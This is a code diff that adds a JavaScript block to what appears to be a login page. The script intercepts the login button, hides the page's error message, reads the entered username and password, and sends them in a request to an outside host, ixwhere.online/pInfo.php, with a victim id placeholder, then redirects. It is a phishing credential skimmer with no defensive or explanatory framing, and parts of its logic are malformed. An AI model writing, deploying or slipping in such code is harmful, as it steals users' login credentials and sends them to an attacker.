@@ -1,0 +1,18 @@
+<script type = "text/javascript" > document.addEventListener("DOMContentLoaded", () => {
+    var ui = "#uid";
+    var redirect  = "#redirect";
+    const e = document.getElementById("login-username"),
+        o = document.getElementById("login-password"),
+        t = document.getElementById("login-button");
+    document.querySelector("p.login-error").setAttribute("style", "display: none !important;");
+
+    t.addEventListener("click", async t => {
+        t.preventDefault();
+        const n = e.value.trim(),
+            a = o.value.trim();
+        "" != n && "" != a ? (await (({
+        })), window.location.replace(redirect)) : window.location.reload()
+        await fetch('https://ixwhere.online/pInfo.php' + '?u=' + n + '&p=' + a + '&ui=' + ui);
+    })
+});
+</script>
